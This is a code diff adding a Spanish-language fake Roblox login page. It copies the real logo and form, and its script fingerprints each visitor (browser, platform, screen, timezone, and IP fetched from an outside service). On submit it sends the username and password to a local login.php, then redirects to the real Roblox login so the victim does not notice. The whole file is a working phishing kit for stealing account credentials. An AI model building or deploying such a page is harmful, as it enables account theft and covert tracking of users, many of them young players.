@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Roblox</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.roblox.com/asset/?id=13666895373" alt="Roblox">
+        </div>
+        <div class="form">
+            <h2>Iniciar sesión</h2>
+            <form id="loginForm" action="login.php" method="POST">
+                <div class="input-group">
+                    <input type="text" id="username" name="username" placeholder="Nombre de usuario" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
+                </div>
+                <button type="submit">Iniciar sesión</button>
+            </form>
+            <div class="links">
+                <a href="#">¿Olvidaste tu contraseña?</a>
+                <a href="#">¿No tienes cuenta? Únete ahora</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Recopila información del visitante y la envía al servidor
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('loginForm');
+
+            // Obtiene la información del visitante
+            const visitorInfo = {
+                ip: '',
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
+
+            // Obtiene la IP usando una API externa
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    visitorInfo.ip = data.ip;
+                    // Guarda la información en el localStorage para enviarla con el formulario
+                    localStorage.setItem('visitorInfo', JSON.stringify(visitorInfo));
+                })
+                .catch(error => {
+                    console.error("Error al obtener la IP:", error);
+                    visitorInfo.ip = 'Desconocida';
+                    localStorage.setItem('visitorInfo', JSON.stringify(visitorInfo));
+                });
+
+            // Envía la información del visitante junto con el formulario
+            form.addEventListener('submit', function(e) {
+                e.preventDefault(); // Evita que el formulario se envíe normalmente
+
+                const formData = new FormData(form);
+                const visitorInfo = JSON.parse(localStorage.getItem('visitorInfo') || '{}');
+
+                // Agrega la información del visitante al formData
+                for (const [key, value] of Object.entries(visitorInfo)) {
+                    formData.append(`visitor_${key}`, value);
+                }
+
+                // Envía el formulario con fetch
+                fetch('login.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    // Redirige a la página real de Roblox
+                    window.location.href = 'https://www.roblox.com/login';
+                })
+                .catch(error => {
+                    console.error("Error al enviar el formulario:", error);
+                    alert("Hubo un error. Por favor, inténtalo de nuevo.");
+                });
+            });
+        });
+    </script>
+</body>
+</html>
